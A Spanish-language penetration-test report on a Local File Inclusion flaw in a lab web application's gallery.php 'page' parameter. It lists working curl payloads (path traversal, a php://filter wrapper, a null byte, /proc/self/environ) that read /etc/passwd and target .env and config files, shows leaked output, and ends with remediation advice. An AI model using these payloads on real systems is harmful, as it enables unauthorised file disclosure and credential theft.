# Informe de auditoría LFI — 2026-04-27T16:02:26Z

Objetivo: http://web.dev.local:8081

Resumen ejecutivo:
- Vulnerabilidad encontrada: Local File Inclusion (LFI) en gallery.php a través del parámetro "page".
- Evidencia: Lectura exitosa de /etc/passwd y lectura base64 vía php://filter (se incluye evidencia abajo).
- Impacto: Acceso a ficheros sensibles del sistema (p. ej. /etc/passwd). Marcar como explotado (lectura de archivos críticos).

Parámetro vulnerable:
- Archivo/URL: /gallery.php
- Parámetro: page

Comandos y metodología (comandos exactos ejecutados en laboratorio):

1) Reconocimiento de la página principal
- curl -s -D /tmp/home_headers.txt -o /tmp/homepage.html -w "%{http_code}" http://web.dev.local:8081

2) Fuzzing / pruebas dirigidas contra gallery.php (payloads probados):
- curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd"
- curl -s "http://web.dev.local:8081/gallery.php?page=../../etc/passwd"
- curl -s "http://web.dev.local:8081/gallery.php?page=/etc/passwd"
- curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd"
- curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd%00"
- curl -s "http://web.dev.local:8081/gallery.php?page=/proc/self/environ"

3) Script usado para automatizar las pruebas (local):
- /tmp/run_lfi.sh (se ejecutó en entorno de laboratorio), contenía las solicitudes anteriores iterando sobre parámetros comunes y payloads.

Payloads que permitieron descubrir ficheros de la app y del sistema:
- ../../../../../../etc/passwd  -> Lectura directa de /etc/passwd mostrada en la plantilla.
- php://filter/read=convert.base64-encode/resource=/etc/passwd -> Lectura codificada en base64 (útil cuando el contenido puede ser filtrado o limpiado por el HTML).

Evidencia (extractos):
- Resultado parcial de /etc/passwd incluido en la respuesta de gallery.php?page=../../../../../../etc/passwd:

  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  ...

- Resultado parcial de php://filter (base64) dentro de la plantilla (decodificando se obtiene el mismo /etc/passwd):
  cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA== ... (base64 de /etc/passwd)

Pruebas adicionales y posibilidades de explotación:
- /proc/self/environ y otros ficheros de proceso pueden permitir vectores de RCE en combinación con log poisoning o inclusión de fichero escrito por una funcionalidad vulnerable (ej. subida de ficheros, logs accesibles desde web root).
- Si existen archivos de configuración de aplicaciones (.env, config.php, wp-config.php, .git/config, backups) en rutas alcanzables, pueden leerse con la misma técnica; probar:
  - gallery.php?page=../../../../../../var/www/html/.env
  - gallery.php?page=../../../../../../var/www/html/config.php.bak

Impacto real observado:
- Se obtuvo lectura de un fichero crítico del sistema (/etc/passwd). Aunque /etc/shadow no fue legible (permiso restringido), la capacidad de leer archivos arbitrarios desde el sistema de ficheros constituye una vulnerabilidad grave que facilita escalada de acceso, filtración de credenciales, descubrimiento de claves privadas y potencial RCE.

Recomendaciones (prioritarias):
1. Validar y sanear estrictamente los parámetros que se usan para incluir ficheros (evitar inclusión directa del input del usuario en include/require).
2. Usar un white-list de plantillas permitidas (p. ej. mapping desde nombres lógicos a archivos concretos en servidor) en lugar de concatenar rutas con la entrada del usuario.
3. Evitar publicar rutas del sistema y deshabilitar wrappers innecesarios (bloquear php:// wrapper donde proceda).
4. Restringir permisos de ficheros sensibles y aplicar el principio de menor privilegio al proceso web.
5. Revisar logs y buscar accesos sospechosos; rotar credenciales si se sospecha compromiso.

Anexos:
- Archivo con registros de las solicitudes y respuestas guardado en: /tmp/gallery_lfi.txt y /tmp/lfi_results.txt en el entorno de laboratorio.

Fin del informe.
